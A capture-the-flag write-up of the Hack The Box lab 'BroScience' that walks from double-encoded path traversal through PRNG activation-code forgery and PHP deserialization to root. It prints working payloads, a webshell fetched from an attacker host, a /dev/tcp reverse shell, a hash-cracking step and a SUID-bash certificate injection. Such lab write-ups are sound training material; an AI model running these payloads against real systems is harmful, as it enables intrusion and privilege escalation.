---
title: "BroScience — LFI to Weak PRNG to PHP Object Injection to Root"
summary: "Double-encoded traversal gives source, source gives a seedable PRNG and an unserialize() on a cookie, and a root cron job reading bill's certificate gives root."
date: 2026-09-06
draft: false
tier: full
aliases:
  - /writeups/offensive/broscience/
  - /writeups/broscience-attack/
categories:
  - Offensive
tags:
  - BroScience
  - Hack The Box
  - Linux
  - Web
  - PHP
  - Deserialization
  - Command Injection
ShowToc: true
TocOpen: false
---

## Overview

**Box:** BroScience (Hack The Box) · **OS:** Linux (Debian 11) · **Difficulty:** Medium

**Chain:** double-encoded path traversal, source disclosure, `srand(time())` activation-code forgery, PHP object injection via the `user-prefs` cookie, webshell, salted-MD5 crack to `bill`, command injection in a root cron script.

<!-- Re-link these when the sibling pages publish:
     [Remediation and CVSS scoring](../../defensive/broscience-remediation/)
     [detection content](../../defensive/broscience-detection/) -->
This is the attack half of a three-part writeup. Remediation and CVSS scoring for these findings, and detection content for the same chain, are separate pages, still in draft.

If you want the commands without the reasoning, there is a [speedrun version]({{< relref "/work/writeups/speedrun/broscience" >}}).

## 1. Recon

Full TCP sweep, then version and script scan on what came back.

```bash
nmap -p- --min-rate 10000 -T4 -oA nmap/allports 10.129.228.129
nmap -sC -sV -p 22,80,443 -oA nmap/detail 10.129.228.129
```

```text
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp  open  http     Apache httpd 2.4.54
|_http-title: Did not follow redirect to https://broscience.htb/
443/tcp open  ssl/http Apache httpd 2.4.54 ((Debian))
|_http-title: BroScience : Home
| ssl-cert: Subject: commonName=broscience.htb/organizationName=BroScience/countryName=AT
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

SSH 8.4p1 on Debian 11 has nothing free, so the attack surface is the web tier. Port 80 redirects to 443, which I noted as a possible lever. If an app can be forced back into plain HTTP you sometimes get behavior the developer never intended around cookie flags and cert checks. It did not end up mattering here, but it is worth writing down every time.

```bash
echo "10.129.228.129 broscience.htb" | sudo tee -a /etc/hosts
```

## 2. Finding the file read

The site is a bodybuilding-themed PHP app: articles, login, registration, user profiles.

Standard opening on any web target, run in the background while I read the application by hand. Content discovery with a PHP extension, then virtual host enumeration, because a second vhost is free scope and costs one command:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
     -u https://broscience.htb/FUZZ -k -mc 200,301,302,403

ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \
     -u https://broscience.htb/FUZZ -k -e .php -mc 200,301,302,403

ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -u https://broscience.htb/ -H "Host: FUZZ.broscience.htb" -k -mc all -fs <baseline>
```

Parameter discovery on any endpoint that looks like it takes input but does not advertise what:

```bash
arjun -u https://broscience.htb/user.php
```

I run this on every web box before anything else because it is cheap and it occasionally hands you the whole thing. On BroScience it was not what found the entry point. That came from reading the rendered page source.

Images on the site are not referenced as static files. Every one of them is fetched through a PHP script with the filename passed as a query parameter:

```html
<img src="/includes/img.php?path=default.png">
```

Serving a static asset through an interpreter is slower and more complex than letting the web server hand back the file, so a developer who does it anyway has written custom code that takes a filename from the client and resolves it into a path on disk. Whatever validation exists is theirs, not the web server's. A parameter named `path` feeding something that returns file bytes is worth attacking before anything else on the site.

There is a second route to the same place, and other published writeups take it: content discovery surfaces `/includes/img.php` on its own, and requesting it with no query string returns an error complaining that the `path` parameter is missing. An endpoint that names the parameter it wants in an error message is the same lead by a different door.

This naive attempt was blocked with an empty response:

```http
GET /includes/img.php?path=../../../../etc/passwd
```

So there is a filter. I worked through the usual filter shapes: non-recursive strip (`....//`), literal-string block (`..%2f`), single-decode block (`..%252f`), and encoding the percent character itself (`..%25%32%66`). Single encoding got nowhere. Double encoding did:

```http
GET /includes/img.php?path=..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd
```

The variant that was most reliable in Burp Repeater encodes the percent sign, so the server sees `%2f` after its first decode pass:

```http
GET /includes/img.php?path=..%25%32%66..%25%32%66..%25%32%66..%25%32%66etc%25%32%66passwd
```

```text
root:x:0:0:root:/root:/bin/bash
...
postgres:x:106:113:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
bill:x:1000:1000:,,,:/home/bill:/bin/bash
```

Two things went straight into the notes file: `bill` is the only real user account with a home directory, and PostgreSQL is installed.

{{< callout icon="📖" kind="note" >}}
On naming, because the distinction matters for what comes next. This is a directory traversal leading to arbitrary file read, not a local file inclusion. In an LFI the retrieved file is handed to the interpreter and executed, which is why LFI chains to RCE through log poisoning, session files, or `php://` wrappers. Here `img.php` opens the file and returns its bytes, so PHP source comes back as source instead of running.

That is the more useful outcome in this case. A genuine LFI pointed at `utils.php` would have executed it and shown me nothing. Reading it as text is what exposed both of the bugs the rest of this chain depends on.
{{< /callout >}}

{{< callout icon="🧠" kind="lesson" >}}
Double encoding works here because two decoders are in play: the layer that populates PHP's superglobals, and whatever the application does with the string afterwards. If the filter runs between those two decodes, `%252f` looks like the harmless literal text `%2f` when it is checked, and a later decode turns it into a slash after the check has passed. This is CWE-174, Double Decoding of the Same Data.
{{< /callout >}}

## 3. Reading source through the file read

Arbitrary file read on a PHP application is a source disclosure primitive, so I stopped hunting and started reading code.

The first question is where to start, because you cannot read a file you cannot name. The answer is that the application hands you the list. Every link in the navigation and every path in the rendered HTML is a filename you now have read access to. On this site that gives `index.php`, `login.php`, `register.php`, `user.php`, `comment.php` and `exercise.php` before guessing anything.

One note on traversal depth, since it changes between sections. `img.php` lives in `/var/www/html/includes/`, so a single `..%252F` lands in the web root where the top-level pages are. The five-deep version in the last section was aimed at `/etc/passwd` and had to climb all the way to `/`.

```http
GET /includes/img.php?path=..%252Flogin.php
GET /includes/img.php?path=..%252Fregister.php
GET /includes/img.php?path=..%252Fuser.php
```

From there the source names its own next targets, and that loop is the whole technique: read a file, collect every path it references, read those, repeat until nothing new turns up. Nothing below was guessed. Each file came from a reference inside a file I had already read.

`login.php` and `register.php` both pull in two includes at the top, which is where the next two filenames came from:

```php
require_once 'includes/db_connect.php';
require_once 'includes/utils.php';
```

This cost me time. I could not read `includes/utils.php` directly even though `img.php` lives in that same directory, so `path=utils.php` should logically resolve. It does not. Traversing out and back in works:

```http
GET /includes/img.php?path=..%252Fincludes%252Futils.php
GET /includes/img.php?path=..%252Fincludes%252Fdb_connect.php
```

When a traversal primitive refuses a path, that does not mean the file is missing. Change the shape of the path. Up one level and back down is a different string to the filter and the same file to the filesystem.

### includes/db_connect.php

```php
<?php
$db_host = "localhost";
$db_port = "5432";
$db_name = "broscience";
$db_user = "dbuser";
$db_pass = "RangeOfMotion%777";
$db_salt = "NaCl";

$db_conn = pg_connect("host={$db_host} port={$db_port} dbname={$db_name} user={$db_user} password={$db_pass}");
?>
```

Hardcoded database credentials and the password salt, both readable without authenticating. `pg_connect` confirms PostgreSQL. 5432 is not reachable from outside, so this is a post-foothold asset.

### includes/utils.php

Both of the real bugs live in this one file. Activation code generation:

```php
function generate_activation_code() {
    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    srand(time());
    $activation_code = "";
    for ($i = 0; $i < 32; $i++) {
        $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];
    }
    return $activation_code;
}
```

And the classes at the bottom of the same file:

```php
class UserPrefs {
    public $theme;
    public function __construct($theme = "light") { $this->theme = $theme; }
}

function get_theme() {
    if (isset($_SESSION['id'])) {
        if (!isset($_COOKIE['user-prefs'])) {
            $up_cookie = base64_encode(serialize(new UserPrefs()));
            setcookie('user-prefs', $up_cookie);
        } else {
            $up_cookie = $_COOKIE['user-prefs'];
        }
        $up = unserialize(base64_decode($up_cookie));
        return $up->theme;
    } else {
        return "light";
    }
}

class Avatar {
    public $imgPath;
    public function __construct($imgPath) { $this->imgPath = $imgPath; }
    public function save($tmp) {
        $f = fopen($this->imgPath, "w");
        fwrite($f, file_get_contents($tmp));
        fclose($f);
    }
}

class AvatarInterface {
    public $tmp;
    public $imgPath;
    public function __construct($tmp, $imgPath) {
        $this->tmp = $tmp;
        $this->imgPath = $imgPath;
    }
    public function __wakeup() {
        $a = new Avatar($this->imgPath);
        $a->save($this->tmp);
    }
}
```

From `register.php`, the two details I needed. The first is the hash construction, which matters in section 8. The second gave me the activation endpoint and its parameter name, neither of which I would have found by fuzzing:

```php
$password = md5($db_salt . $_POST['password']);
$activation_link = "https://broscience.htb/activate.php?code={$activation_code}";
```

At this point the whole path was on paper before I sent a single exploit request.

## 4. Predictable activation codes (CWE-338)

`rand()` in PHP is a non-cryptographic PRNG and is fully deterministic given its seed. The seed here is `time()`, a Unix timestamp at one-second resolution, which the server publishes in the `Date:` header of every response.

The 32-character code has an effective key-space of one if you know the second it was minted. Clock skew and request latency mean you do not know it exactly, so the practical keyspace is about plus or minus five seconds, or eleven candidates. 62^32 collapses to 11.

{{< callout icon="🎯" kind="lesson" >}}
When `rand()`, `mt_rand()`, `srand()`, `shuffle()`, `str_shuffle()` or `uniqid()` produces anything security-relevant, the follow-up question is always what the seed is and whether it can be observed or narrowed. If it is `time()`, `microtime()`, a PID, or a row ID, it is observable. If it is `random_bytes()` or `random_int()`, move on. Same bug in `java.util.Random`, Python's `random`, Go's `math/rand`, and `Math.random()`.
{{< /callout >}}

### Exploiting it

Register an account and capture the response. The `Date:` header on that response is the seed, or within a second or two of it.

```http
POST /register.php HTTP/1.1
Host: broscience.htb
Content-Type: application/x-www-form-urlencoded

username=hacker&email=hacker@broscience.htb&password=hacker&password-confirm=hacker
```

The only header needed from the response is the timestamp:

```http
Date: Fri, 05 Jun 2026 16:21:48 GMT
```

My first attempt failed and it took me about an hour to work out why. I converted the `Date:` header to a Unix timestamp by hand and pasted the integer into the script. The conversion introduced a timezone error, so every code I generated was garbage and the fuzz run came back with nothing. The fix is to hand the header string to `strtotime()` and let PHP do the conversion inside the script.

`crack.php`:

```php
<?php
// Paste the Date: header verbatim. Do not convert it by hand.
$base = strtotime("Fri, 05 Jun 2026 16:21:48 GMT");
echo "seed base: " . $base . "\n";

$chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";

for ($t = $base - 5; $t <= $base + 5; $t++) {
    srand($t);
    $code = "";
    for ($i = 0; $i < 32; $i++) {
        $code .= $chars[rand(0, strlen($chars) - 1)];
    }
    echo "$t : $code\n";
}
```

```bash
# grep filters out the "seed base:" line, which otherwise lands in the wordlist
# as a 12th candidate because awk picks up its third field too
php crack.php | grep ' : ' | awk '{print $3}' > activ.txt
wc -l activ.txt
# 11 activ.txt
```

The activation URL format came from `register.php`:

```bash
ffuf -w activ.txt -u "https://broscience.htb/activate.php?code=FUZZ" -k -mc all -fs 0
```

One code returns a different response length. Account activated, log in as `hacker:hacker`.

> The box reverts on a timer and deletes accounts you create. I went through registration and activation three separate times over the course of this box. If your login stops working after a break, do not debug it, just re-run the four commands above. Worth scripting if you are working across multiple sessions.

## 5. PHP object injection (CWE-502)

Authenticated now, which matters because `get_theme()` checks `isset($_SESSION['id'])` and returns early for anonymous users. The deserialization is unreachable until you have a session, which is why the activation-code work in the last section was a prerequisite and not a detour.

Reading `index.php` shows the call site: it invokes `get_theme()` on page load to decide which stylesheet to emit. The theme toggle in the page header points at `themeswitch.php`, which is the other half of the pair and the one to avoid. More on that in section 6.

PHP object injection is two bugs stacked and you need both.

### Part 1: the injection point

```php
$up = unserialize(base64_decode($up_cookie));   // $up_cookie = $_COOKIE['user-prefs']
```

No signature, no HMAC, no allowlist, no `['allowed_classes' => false]`. A cookie goes straight into `unserialize()`, so I can make the PHP runtime instantiate an arbitrary object of any loaded class with arbitrary property values. On its own that is only the ability to make objects, and objects nobody calls methods on are inert.

### Part 2: the gadget chain

`unserialize()` does not just allocate memory. During object reconstruction it automatically invokes magic methods, including `__wakeup()`, and later `__destruct()`, `__toString()`, `__get()` and `__call()`. That automatic invocation is the bridge from arbitrary object to arbitrary code path.

```php
class AvatarInterface {
    public $tmp;
    public $imgPath;
    public function __wakeup() {
        $a = new Avatar($this->imgPath);
        $a->save($this->tmp);
    }
}
```

`__wakeup()` fires on its own and passes two attacker-set properties into `Avatar`. The sink:

```php
public function save($tmp) {
    $f = fopen($this->imgPath, "w");     // attacker-controlled write destination
    fwrite($f, file_get_contents($tmp)); // attacker-controlled read source
    fclose($f);
}
```

`file_get_contents()` under default PHP configuration accepts URL wrappers (`http://`, `ftp://`, `data://`, `php://`), so `$tmp` is an arbitrary remote fetch. `fopen($this->imgPath, "w")` is an arbitrary local write. Two strings, one request, remote code execution.

### Data flow

```text
attacker cookie (user-prefs)
  -> base64_decode()
  -> unserialize()                        no validation, no allowed_classes
  -> AvatarInterface with attacker properties
  -> __wakeup() fires automatically
  -> new Avatar($imgPath) -> save($tmp)
  -> fwrite( fopen($imgPath,"w"), file_get_contents($tmp) )
  -> webshell in the document root
```

### Finding gadgets like this

The process is mechanical once you have an `unserialize()` on user input:

1. Enumerate every class in scope at the moment of the call, including anything required or auto-loaded. Vendor classes count, which is what PHPGGC automates.
2. Grep for magic methods: `__wakeup`, `__destruct`, `__toString`, `__call`, `__get`, `__set`, `__invoke`. These are the entry points because they run without being called.
3. Trace each one forward to a sink: `system`/`exec`/`passthru`/`popen`, `eval`, `include`/`require`, `file_put_contents`/`fwrite`/`fopen`, `unlink`, `call_user_func`, `mail`, SQL string concatenation.
4. For every property in the chain, ask whether you control it. `unserialize()` does not call `__construct()`, it populates properties directly, which is why you control all of them.

Here the whole search is one file long. In a Laravel or Symfony app it becomes a graph search, but it is the same search.

## 6. Building the payload

### Step A: the shell to be written

`shell.php`:

```php
<?php system($_GET['cmd']); ?>
```

### Step B: generate the cookie

`gen.php`, run locally. The class definition is a stub. `unserialize()` matches on class name and property names, so as long as those match, PHP populates the object on the target with my values.

```php
<?php
class AvatarInterface {
    public $tmp;
    public $imgPath;
}

$o = new AvatarInterface();
$o->tmp     = "http://10.10.14.247:8000/shell.php";  // SOURCE, fetched by file_get_contents()
$o->imgPath = "/var/www/html/shell.php";             // DEST, written by fopen()/fwrite()
$serialized = serialize($o);
echo "raw:    " . $serialized . "\n";
echo "cookie: " . base64_encode($serialized) . "\n";
```

```text
raw:    O:15:"AvatarInterface":2:{s:3:"tmp";s:34:"http://10.10.14.247:8000/shell.php";s:7:"imgPath";s:23:"/var/www/html/shell.php";}
cookie: TzoxNToiQXZhdGFySW50ZXJmYWNlIjoyOntzOjM6InRtcCI7czozNDoiaHR0cDovLzEwLjEwLjE0LjI0Nzo4MDAwL3NoZWxsLnBocCI7czo3OiJpbWdQYXRoIjtzOjIzOiIvdmFyL3d3dy9odG1sL3NoZWxsLnBocCI7fQ==
```

Worth reading the raw form by hand once. `O:15:"AvatarInterface"` is an object whose class name is 15 characters, `:2:` is two properties, `s:3:"tmp"` is a string of length 3. Those length prefixes are why you generate this with a script rather than editing it by hand. Get one wrong and `unserialize()` returns `false` with no error.

On the write destination: `/var/www/html` is the Debian default, but it is worth confirming rather than assuming, and the traversal already gives you the means. One request to the vhost config removes a guess from the chain:

```http
GET /includes/img.php?path=..%252F..%252F..%252F..%252Fetc%252Fapache2%252Fsites-enabled%252F000-default.conf
```

### Step C: host the payload

```bash
python3 -m http.server 8000
```

When PHP calls `file_get_contents("http://10.10.14.247:8000/shell.php")`, Python serves the raw PHP source as static text. It never executes on my side, it transfers verbatim and lands as source on the target where Apache will execute it.

{{< callout icon="💡" kind="note" >}}
Alternative with no listener: inline the payload with the `data://` wrapper.

```php
$o->tmp = "data://text/plain;base64," . base64_encode('<?php system($_GET["cmd"]); ?>');
```

This removes the outbound network dependency, which matters when egress is filtered. It also removes the loudest artifact this attack generates, which comes up in the detection companion.
{{< /callout >}}

### Step D: fix the base64 before you send it

This step is easy to skip and then spend an hour debugging a payload that was never wrong. Base64 output uses `+`, `/` and `=`, and all three mean something else inside an HTTP cookie:

- `+` is decoded as a space
- `/` gets mangled by path handling depending on where it lands
- `=` collides with the cookie's own name/value separator

Any one of those corrupts the blob. `base64_decode()` then returns garbage, `unserialize()` returns `false`, and the request succeeds with a normal page and no error telling you why nothing happened.

Percent-encode all three before sending:

```text
+   ->   %2B
/   ->   %2F
=   ->   %3D
```

In Burp Repeater, highlight just the cookie value and press Ctrl+U, which does the same thing without hand-editing.

### Step E: fire it

Set the cookie and request an authenticated page that reads the theme. The `PHPSESSID` is the session from the account activated in section 4.

```http
GET /index.php HTTP/1.1
Host: broscience.htb
Cookie: PHPSESSID=<session from the activated account>; user-prefs=TzoxNToiQXZhdGFySW50ZXJmYWNlIjoyOntzOjM6InRtcCI7...
```

{{< callout icon="⚠️" kind="warning" >}}
This is the trap that cost me the most time on this box. Do not send the payload to `themeswitch.php`. That endpoint calls `set_theme()`, which overwrites `user-prefs` with a freshly serialized `UserPrefs` object and destroys the payload before anything deserializes it. You need a page that reads the theme through `get_theme()`, not one that writes it.

The general form: when a deserialization sink and a serialization source share a storage slot, work out which code path reads and which writes, and only hit the reader. The same mistake shows up with session objects, cache entries and message queues.
{{< /callout >}}

The Python listener logs a single GET for `/shell.php` coming from the target, which confirms the gadget fired on that one request.

## 7. Foothold as www-data

```bash
curl -sk "https://broscience.htb/shell.php?cmd=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Upgrade to interactive:

```bash
nc -lvnp 4444
```

```http
GET /shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.247/4444+0>%261' HTTP/1.1
Host: broscience.htb
```

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
```

## 8. Credentials and lateral movement to bill

I already had the database credentials from reading `db_connect.php` through the file read, before the shell was even stable.

```bash
psql "host=localhost port=5432 dbname=broscience user=dbuser password=RangeOfMotion%777"
```

I had not used psql before, so the commands I needed:

```text
\l              list databases
\c broscience   connect to the broscience DB
\dt             list tables
\d users        describe the users table
\du             list roles
\q              quit
```

```sql
select * from users;
```

```text
 id |   username    |             password             |         email
----+---------------+----------------------------------+-----------------------------
  1 | administrator | 15657792073e8a843d4f91fc403454e1 | administrator@broscience.htb
  2 | bill          | 13edad4932da9dbb57d9cd15b66ed104 | bill@broscience.htb
  3 | michael       | bd3dad50e2d578ecba87d5fa15ca5f85 | michael@broscience.htb
  4 | john          | a7eed23a7be6fe0d765197b1027453fe | john@broscience.htb
  5 | dmytro        | 5d15340bded5b9395d5d14b9c21bc82b | dmytro@broscience.htb
```

I went after `bill` rather than `administrator`. The `/etc/passwd` read back in section 2 showed `bill` is the only account with a home directory and a shell. Admin on the web app is a lateral move inside the app. `bill` is a move onto the host. Attack the credential that crosses a trust boundary.

The hash construction was in `register.php`, `md5($db_salt . $_POST['password'])`, which is a `salt.pass` construction and maps to hashcat mode 20. The salt goes after the hash, colon separated:

```bash
echo '13edad4932da9dbb57d9cd15b66ed104:NaCl' > hash.txt
hashcat -m 20 hash.txt /usr/share/wordlists/rockyou.txt
# 13edad4932da9dbb57d9cd15b66ed104:NaCl:iluvhorsesandgym
```

```bash
ssh bill@broscience.htb
cat /home/bill/user.txt
```

{{< callout icon="🔓" kind="lesson" >}}
This cracked instantly because a single global salt is not really a salt. A salt exists to be unique per credential so an attacker cannot amortize work across the user table. One global salt, hardcoded in a file readable by the web user, means one table computed once for every user. Combine that with MD5's speed, and every password in that table that appears in a word list is toast.
{{< /callout >}}

## 9. Privilege escalation: command injection in the certificate renewal script (CWE-78)

### Finding it

Standard local enumeration first, none of which turned up anything usable:

```bash
sudo -l
crontab -l
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
```

Nothing fruitful there, so I moved to pspy64 to watch for activity I could not see directly.

`crontab -l` only shows your own crontab. Root's cron jobs, systemd timers and anything run by another user are invisible to it, and that blind spot is the entire reason this box is rootable. pspy fills it by polling `/proc` to observe process creation without needing root.

```bash
# attacker box
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
python3 -m http.server 8000

# target as bill
cd /tmp
wget http://10.10.14.247:8000/pspy64
chmod +x pspy64
./pspy64
```

Then generate activity. I opened a second SSH session so any login-triggered scripts would fire, and waited for the cron cycle.

pspy showed a repeating UID=0 sequence: cron firing a shell script out of root's home, which in turn ran `/bin/bash /opt/renew_cert.sh` with `/home/bill/Certs/broscience.crt` as its argument, followed by an `openssl x509 -checkend 86400` against that same certificate.

Root, on a schedule, running a script in `/opt` against a certificate inside bill's home directory. A high-privilege process consuming a low-privilege user's data is a privilege boundary violation regardless of what the script does with it.

### Reading the script

pspy gave me the path, and the script is world-readable, so reading it is one command:

```bash
cat /opt/renew_cert.sh
```

```bash
#!/bin/bash

if [ "$#" -ne 1 ] || [ $1 == "-h" ] || [ $1 == "--help" ] || [ $1 == "help" ]; then
    echo "Usage: renew_cert.sh certificate.cnf";
    exit 0;
fi

if [ -f $1 ]; then
    openssl x509 -in $1 -noout -checkend 86400 > /dev/null
    if [ $? -eq 0 ]; then
        echo "No need to renew yet.";
        exit 1;
    fi

    subject=$(openssl x509 -in $1 -noout -subject | cut -d "=" -f2-)
    country=$(echo $subject | grep -Eo 'C = .{2}')
    state=$(echo $subject | grep -Eo 'ST = .*,')
    locality=$(echo $subject | grep -Eo 'L = .*,')
    organization=$(echo $subject | grep -Eo 'O = .*,')
    organizationUnit=$(echo $subject | grep -Eo 'OU = .*,')
    commonName=$(echo $subject | grep -Eo 'CN = .*,?')
    emailAddress=$(openssl x509 -in $1 -noout -email)

    country=${country:4}
    state=$(echo ${state:5} | awk -F, '{print $1}')
    locality=$(echo ${locality:3} | awk -F, '{print $1}')
    organization=$(echo ${organization:4} | awk -F, '{print $1}')
    organizationUnit=$(echo ${organizationUnit:5} | awk -F, '{print $1}')
    commonName=$(echo ${commonName:5} | awk -F, '{print $1}')

    openssl req -new -newkey rsa:4096 -keyout /tmp/temp.key -out /tmp/temp.csr -nodes \
        -subj "/C=$country/ST=$state/L=$locality/O=$organization/OU=$organizationUnit/CN=$commonName/emailAddress=$emailAddress"

    /bin/bash -c "mv /tmp/temp.crt /home/bill/Certs/$commonName.crt"
fi
```

### The vulnerability

```bash
/bin/bash -c "mv /tmp/temp.crt /home/bill/Certs/$commonName.crt"
```

`$commonName` is derived entirely from a file bill controls, it is unquoted at the point of use, and it is interpolated into a string that is then handed to `bash -c`.

`bash -c "..."` takes its argument as a fresh command line and parses it from scratch. The outer script expands `$commonName` into the string, producing something like:

```bash
mv /tmp/temp.crt /home/bill/Certs/$(cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash).crt
```

and hands that text to a new bash, which performs command substitution on it as part of normal parsing. CWE-78 in its most common real-world form: data crossing into a command context without quoting or escaping.

{{< callout icon="❗" kind="warning" >}}
One mechanism worth being precise about, because I had it wrong in my own notes. Command substitution does not fire when a variable containing `$( )` is expanded. Bash performs expansions on the literal text of a command line, not recursively on the results of those expansions. If `x='$(id)'`, then `echo $x` prints `$(id)` and runs nothing.

So the payload is not detonating early inside the `echo $subject` or `awk` steps. It survives all of them as inert text, and it executes at exactly one place: the moment `bash -c` re-parses the assembled string. Every intermediate step is just a chance for the payload to get mangled, not a chance for it to run.
{{< /callout >}}

### Semicolon vs command substitution

My first attempt used a semicolon in the CN and it did not work. The command substitution version did. I never isolated why the semicolon variant failed, but it failed repeatedly.

Given the mechanism above, a semicolon should in principle also reach `bash -c` and split into separate commands. The likely candidates for what broke it are the transformations between the certificate and the final line: `grep -Eo 'CN = .*,?'`, the `${commonName:5}` substring, and `awk -F, '{print $1}'`, plus how OpenSSL itself renders the subject when the CN contains shell meta characters. Command substitution is a single self-contained token with no spaces or separators that those steps can split on, which is probably why it survived where the semicolon form did not.

If you reproduce this box, and want to troubleshoot, echo `$commonName` at each stage and watch where the semicolon payload gets truncated.

### Building the malicious certificate

The script only proceeds if `openssl x509 -checkend 86400` fails, so the certificate has to expire within 24 hours. Generate with `-days 1`.

Config file version, which is repeatable and easy to paste:

```bash
cat > /tmp/oc.cnf <<'CNF'
[req]
distinguished_name = dn
prompt = no

[dn]
# CN = a; cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash;   <-- semicolon form, did not work for me
CN = $(cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash)
CNF
```

The heredoc is quoted so my local shell does not expand the `$( )` before it reaches the file.

```bash
mkdir -p /home/bill/Certs

openssl req -x509 -newkey rsa:2048 -nodes \
  -keyout /tmp/k.key \
  -out /tmp/evil.crt \
  -days 1 \
  -config /tmp/oc.cnf

cp /tmp/evil.crt /home/bill/Certs/broscience.crt
```

> Generate to `/tmp/evil.crt` and copy it into place rather than writing straight to `/home/bill/Certs/`. If the first attempt does not detonate you can re-copy in one command instead of regenerating a keypair every time.

What I actually did first was the interactive version, pressing Enter (providing null or default values) through every prompt until Common Name:

```bash
openssl req -x509 -newkey rsa:2048 -nodes -keyout /dev/null -out /tmp/evil.crt -days 1
```

```text
$(cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash)
```

### Root

Wait for the cron cycle:

```bash
ls -la /tmp/rootbash
# root-owned, SUID and SGID bits set: -rwsr-sr-x

/tmp/rootbash -p
id
# uid=1000(bill) gid=1000(bill) euid=0(root) egid=0(root) groups=1000(bill)

cat /root/root.txt
```

{{< callout icon="🔑" kind="win" >}}
The `-p` matters. Bash drops privileges at startup when the effective UID does not match the real UID, which is a deliberate defense against exactly this. `-p` tells bash not to reset the effective UID. Without it you get a shell that looks SUID and behaves like `bill`.
{{< /callout >}}

## What didn't work

**Single-encoded traversal.** `../../../../etc/passwd` and `..%2f` both returned an empty response. Only after working through the filter shapes did `..%252f` land, with the percent-of-percent form `..%25%32%66` proving most reliable in Repeater.

**`path=utils.php`.** `img.php` lives in `/var/www/html/includes/`, so a bare filename should have resolved to a sibling file in the same directory. It does not. Traversing out to the web root and back down into `includes/` reaches the same file.

**Converting the `Date:` header by hand.** About an hour lost. The hand-converted Unix timestamp carried a timezone error, so every candidate code was wrong and the ffuf run returned nothing. Passing the header string to `strtotime()` inside the script fixed it.

**Sending the payload to `themeswitch.php`.** The single most expensive mistake on this box. That endpoint writes the cookie rather than reading it, so `set_theme()` overwrote the gadget with a fresh `UserPrefs` object before anything deserialized it.

**A semicolon in the Common Name.** Failed repeatedly where the command-substitution form worked. I never isolated why, and the section above lays out the candidates rather than claiming a cause I did not confirm.

**Local enumeration before pspy.** `sudo -l`, `crontab -l`, the SUID sweep and `getcap -r /` all came back empty. Everything that mattered was running as root on a schedule, which none of those commands can see.

**ffuf and arjun.** Both ran, neither found the entry point. The `path=` parameter came from reading rendered HTML.

## Takeaways

None of this is exotic. A `path=` parameter, a `rand()` where `random_bytes()` belonged, an `unserialize()` on a cookie, an unquoted variable in a shell script. All four turn up in production code and three of them would survive a casual code review.

The thing I took away is that the vulnerability is usually not where the interesting output shows up. The file read did not get me a shell, it got me the source containing the two bugs that did. The `chmod +s` was not the privilege escalation, it was the last step of one that actually happened when root read a file bill could write.

Six findings came out of this chain, and all six are load bearing for the path from an anonymous HTTP request to root. The findings table, CVSS scoring with defensible alternates, and code-level remediation for each are on the remediation page. Detection content for the same chain is on the detection page. Both are still in draft.
<!-- Re-link on publish: [remediation page](../../defensive/broscience-remediation/) and [detection page](../../defensive/broscience-detection/) -->

---

*Written from my own notes. Public writeups were consulted only to confirm exact source listings and service versions after my own pass was complete.*

*On evidence: source listings, the database dump, and the credentials above are reproduced from what I captured during the box. I did not record a full terminal session, so a few routine command outputs are described rather than pasted.*
